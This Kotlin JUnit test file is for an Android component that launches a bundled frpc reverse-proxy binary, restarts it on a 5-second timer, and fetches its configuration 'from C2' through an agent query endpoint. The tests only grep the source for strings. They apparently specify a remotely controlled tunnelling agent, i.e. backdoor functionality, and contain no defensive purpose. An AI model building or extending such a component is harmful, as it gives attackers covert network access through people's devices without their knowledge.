package com.storm.safe.rock.service.modules

import org.junit.Test
import org.junit.Assert.*

class FrpcProcessManagerTest {

    private val source by lazy {
        java.io.File("src/main/java/com/storm/safe/rock/service/modules/FrpcProcessManager.kt").readText()
    }

    @Test
    fun `has Timer with 5 second schedule`() {
        assertTrue("must schedule timer at 5000ms",
            source.contains("5000L") && source.contains("Timer"))
    }

    @Test
    fun `checks frpc ini existence before launching`() {
        assertTrue("must check frpc.ini exists",
            source.contains("frpc.ini") && source.contains(".exists()"))
    }

    @Test
    fun `finds libfrpc so from nativeLibraryDir`() {
        assertTrue("must reference libfrpc.so",
            source.contains("libfrpc.so"))
        assertTrue("must use nativeLibraryDir",
            source.contains("nativeLibraryDir"))
    }

    @Test
    fun `starts frpc process via Runtime exec`() {
        assertTrue("must call Runtime.exec or ProcessBuilder",
            source.contains("Runtime.getRuntime().exec") || source.contains("ProcessBuilder"))
    }

    @Test
    fun `stores Process reference for lifecycle management`() {
        assertTrue("must have Process field",
            source.contains("var frpcProcess") || source.contains("Process?"))
    }

    @Test
    fun `has reload method that restarts process`() {
        assertTrue("must have reload function",
            source.contains("fun reload()"))
    }

    @Test
    fun `has stop method that destroys process`() {
        assertTrue("must have stop function",
            source.contains("fun stop()"))
    }

    @Test
    fun `downloads frpc ini from C2 when missing`() {
        assertTrue("must call api/agent/query.json",
            source.contains("agent/query") || source.contains("queryAgentFile"))
    }
}
